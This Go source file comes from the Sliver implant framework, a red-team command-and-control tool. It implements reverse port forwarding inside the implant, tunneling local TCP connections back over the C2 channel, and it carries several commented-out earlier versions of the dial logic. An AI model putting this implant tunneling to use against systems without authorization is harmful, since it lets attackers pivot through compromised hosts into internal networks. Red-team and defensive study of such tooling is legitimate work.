package rportfwd

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"encoding/binary"
	"io"
	"log"
	"math/rand"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/tcpproxy"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	// Portfwds - Struct instance that holds all the portfwds
	Portfwds = portfwds{
		forwards: map[int]*Portfwd{},
		mutex:    &sync.RWMutex{},
	}

	portfwdID = 0
)

// PortfwdMeta - Metadata about a portfwd listener
type PortfwdMeta struct {
	ID         int
	SessionID  string
	BindAddr   string
	RemoteAddr string
}

// Portfwd - Tracks portfwd<->tcpproxy
type Portfwd struct {
	ID           int
	TCPProxy     *tcpproxy.Proxy
	ChannelProxy *ChannelProxy
}

// GetMetadata - Get metadata about the portfwd
func (p *Portfwd) GetMetadata() *PortfwdMeta {
	return &PortfwdMeta{
		ID:         p.ID,
		BindAddr:   p.ChannelProxy.BindAddr,
		RemoteAddr: p.ChannelProxy.RemoteAddr,
	}
}

type portfwds struct {
	forwards map[int]*Portfwd
	mutex    *sync.RWMutex
}

// Add - Add a TCP proxy instance
func (f *portfwds) Add(tcpProxy *tcpproxy.Proxy, channelProxy *ChannelProxy) *Portfwd {
	f.mutex.Lock()
	defer f.mutex.Unlock()
	portfwd := &Portfwd{
		ID:           nextPortfwdID(),
		TCPProxy:     tcpProxy,
		ChannelProxy: channelProxy,
	}
	f.forwards[portfwd.ID] = portfwd
	return portfwd
}

// Remove - Remove a TCP proxy instance
func (f *portfwds) Remove(portfwdID int) bool {
	f.mutex.Lock()
	defer f.mutex.Unlock()
	if portfwd, ok := f.forwards[portfwdID]; ok {
		portfwd.TCPProxy.Close()
		delete(f.forwards, portfwdID)
		return true
	}
	return false
}

// List - List all TCP proxy instances
func (f *portfwds) List() []*PortfwdMeta {
	f.mutex.RLock()
	defer f.mutex.RUnlock()
	portForwards := []*PortfwdMeta{}
	for _, portfwd := range f.forwards {
		portForwards = append(portForwards, portfwd.GetMetadata())
	}
	return portForwards
}

// ChannelProxy binds the Sliver Tunnel to a net.Conn object
// one ChannelProxy per port bind.
//
// Implements the Target interface from tcpproxy pkg
type ChannelProxy struct {
	Conn *transports.Connection
	//Session  *clientpb.Session

	BindAddr        string
	RemoteAddr      string
	KeepAlivePeriod time.Duration
	DialTimeout     time.Duration
}

// HandleConn - Handle a TCP connection
func (p *ChannelProxy) HandleConn(src net.Conn) {
	log.Printf("[tcpproxy] Handling new connection")
	ctx := context.Background()
	var cancelContext context.CancelFunc
	if p.DialTimeout >= 0 {
		ctx, cancelContext = context.WithTimeout(ctx, p.dialTimeout())
	}
	if conn, ok := src.(*net.TCPConn); ok {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Configuring keep alive")
		// {{end}}
		conn.SetKeepAlive(true)
		// TODO: Make KeepAlive configurable
		conn.SetKeepAlivePeriod(30 * time.Second)
	}
	// Add tunnel
	// {{if .Config.Debug}}
	log.Printf("[rportfwd] Creating tcp tunnel")
	// {{end}}

	tId := NewTunnelID()
	log.Printf("[tcpproxy] Created new tunnel with id %d", tId)

	tunnel := transports.NewTunnel(
		tId,
		src,
		src,
	)
	p.Conn.AddTunnel(tunnel)
	// Create a reverse tunnel, then start it before binding the shell to the newly created tunnel
	// log.Printf("[tcpproxy] Binding tunnel to portfwd %d", p.Port())

	// req := &sliverpb.RPortfwdReq{
	// 	Host:     p.Host(),
	// 	Port:     p.Port(),
	// 	Protocol: sliverpb.PortFwdProtoTCP,
	// 	TunnelID: tId}
	// data, _ := proto.Marshal(req)
	// p.Conn.Send <- &sliverpb.Envelope{ID: EnvelopeID(), Type: sliverpb.MsgPortfwdReq, Data: data}

	cleanup := func(reason error) {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
		// {{end}}
		tunnel := p.Conn.Tunnel(tunnel.ID)

		//tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
		//Closed:   true,
		//	TunnelID: tunnel.ID,
		//})
		//p.Conn.Send <- &sliverpb.Envelope{
		// 	Type: sliverpb.MsgTunnelClose,
		// 	Data: tunnelClose,
		// }
		p.Conn.RemoveTunnel(tunnel.ID)
		src.Close()
		cancelContext()
	}

	go func() {
		tWriter := tunnelWriter{
			tun:      tunnel,
			conn:     p.Conn,
			host:     p.Host(),
			port:     p.Port(),
			protocol: sliverpb.PortFwdProtoTCP,
			tunnelID: tId,
		}
		// portfwd only uses one reader, hence the tunnel.Readers[0]
		n, err := io.Copy(tWriter, tunnel.Readers[0])
		_ = n // avoid not used compiler error if debug mode is disabled
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Tunnel done, wrote %v bytes", n)
		// {{end}}

		cleanup(err)
	}()
}

// HostPort - Returns the host and port of the TCP proxy
func (p *ChannelProxy) HostPort() (string, uint32) {
	defaultPort := uint32(8080)
	host, rawPort, err := net.SplitHostPort(p.RemoteAddr)
	if err != nil {
		log.Printf("Failed to parse addr %s", p.RemoteAddr)
		return "", defaultPort
	}
	portNumber, err := strconv.Atoi(rawPort)
	if err != nil {
		log.Printf("Failed to parse number from %s", rawPort)
		return "", defaultPort
	}
	port := uint32(portNumber)
	if port < 1 || 65535 < port {
		log.Printf("Invalid port number %d", port)
		return "", defaultPort
	}
	return host, port
}

// Port - Returns the TCP port of the proxy
func (p *ChannelProxy) Port() uint32 {
	_, port := p.HostPort()
	return port
}

// Host - Returns the host (i.e., interface) of the TCP proxy
func (p *ChannelProxy) Host() string {
	host, _ := p.HostPort()
	return host
}

// func (p *ChannelProxy) dialC2(ctx context.Context, src net.Conn) (*transports.Tunnel, error) {

// 	log.Printf("[tcpproxy] Dialing implant to create tunnel ...")

// 	if conn, ok := src.(*net.TCPConn); ok {
// 		// {{if .Config.Debug}}
// 		log.Printf("[portfwd] Configuring keep alive")
// 		// {{end}}
// 		conn.SetKeepAlive(true)
// 		// TODO: Make KeepAlive configurable
// 		conn.SetKeepAlivePeriod(30 * time.Second)
// 	}
// 	// Add tunnel
// 	// {{if .Config.Debug}}
// 	log.Printf("[rportfwd] Creating tcp tunnel")
// 	// {{end}}

// 	tId := NewTunnelID()
// 	log.Printf("[tcpproxy] Created new tunnel with id %d", tId)

// 	tunnel := transports.NewTunnel(
// 		tId,
// 		src,
// 		src,
// 	)
// 	p.Conn.AddTunnel(tunnel)
// 	// Create a reverse tunnel, then start it before binding the shell to the newly created tunnel
// 	log.Printf("[tcpproxy] Binding tunnel to portfwd %d", p.Port())

// 	req := &sliverpb.RPortfwdReq{
// 		Host:     p.Host(),
// 		Port:     p.Port(),
// 		Protocol: sliverpb.PortFwdProtoTCP,
// 		TunnelID: tId}
// 	data, _ := proto.Marshal(req)
// 	p.Conn.Send <- &sliverpb.Envelope{Data: data}
// 	/*
// 		portfwdResp, err := p.Rpc.Portfwd(ctx, &sliverpb.PortfwdReq{
// 			Request: &commonpb.Request{
// 				SessionID: p.Session.ID,
// 			},
// 			Host:     p.Host(),
// 			Port:     p.Port(),
// 			Protocol: sliverpb.PortFwdProtoTCP,
// 			TunnelID: tunnel.ID,
// 		})
// 		if err != nil {
// 			return nil, err
// 		}
// 		// Close tunnel in case of error on the implant side
// 		if portfwdResp.Response != nil && portfwdResp.Response.Err != "" {
// 			p.Rpc.CloseTunnel(ctx, &sliverpb.Tunnel{
// 				TunnelID:  tunnel.ID,
// 				SessionID: p.Session.ID,
// 			})
// 			return nil, errors.New(portfwdResp.Response.Err)
// 		}
// 		log.Printf("Portfwd response: %v", portfwdResp)
// 	*/

// 	cleanup := func(reason error) {
// 		// {{if .Config.Debug}}
// 		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
// 		// {{end}}
// 		tunnel := p.Conn.Tunnel(tunnel.ID)

// 		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
// 			Closed:   true,
// 			TunnelID: tunnel.ID,
// 		})
// 		p.Conn.Send <- &sliverpb.Envelope{
// 			Type: sliverpb.MsgTunnelClose,
// 			Data: tunnelClose,
// 		}
// 		p.Conn.RemoveTunnel(tunnel.ID)
// 		src.Close()
// 	}

// 	go func() {
// 		tWriter := tunnelWriter{
// 			tun:  tunnel,
// 			conn: p.Conn,
// 		}
// 		// portfwd only uses one reader, hence the tunnel.Readers[0]
// 		n, err := io.Copy(tWriter, tunnel.Readers[0])
// 		_ = n // avoid not used compiler error if debug mode is disabled
// 		// {{if .Config.Debug}}
// 		log.Printf("[tunnel] Tunnel done, wrote %v bytes", n)
// 		// {{end}}

// 		cleanup(err)
// 	}()
// }

// func (p *ChannelProxy) keepAlivePeriod() time.Duration {
// 	if p.KeepAlivePeriod != 0 {
// 		return p.KeepAlivePeriod
// 	}
// 	return time.Minute
// }

func (p *ChannelProxy) dialTimeout() time.Duration {
	if p.DialTimeout > 0 {
		return p.DialTimeout
	}
	return 30 * time.Second
}

// func toImplantLoop(conn net.Conn, tunnel *TunnelIO, errs chan<- error) {
// 	if wc, ok := conn.(*tcpproxy.Conn); ok && len(wc.Peeked) > 0 {
// 		if _, err := tunnel.Write(wc.Peeked); err != nil {
// 			errs <- err
// 			return
// 		}
// 		wc.Peeked = nil
// 	}
// 	n, err := io.Copy(tunnel, conn)
// 	log.Printf("[tcpproxy] Closing to-implant after %d byte(s)", n)
// 	errs <- err
// }

// func fromImplantLoop(conn net.Conn, tunnel *TunnelIO, errs chan<- error) {
// 	n, err := io.Copy(conn, tunnel)
// 	log.Printf("[tcpproxy] Closing from-implant after %d byte(s)", n)
// 	errs <- err
// }

func nextPortfwdID() int {
	portfwdID++
	return portfwdID
}

// EnvelopeID - Generate random ID of 8 bytes
func EnvelopeID() int64 {
	randBuf := make([]byte, 8) // 64 bits of randomness
	rand.Read(randBuf)
	return int64(binary.LittleEndian.Uint64(randBuf))
}

// NewTunnelID - New 64-bit identifier
func NewTunnelID() uint64 {
	randBuf := make([]byte, 8)
	rand.Read(randBuf)
	return binary.LittleEndian.Uint64(randBuf)
}
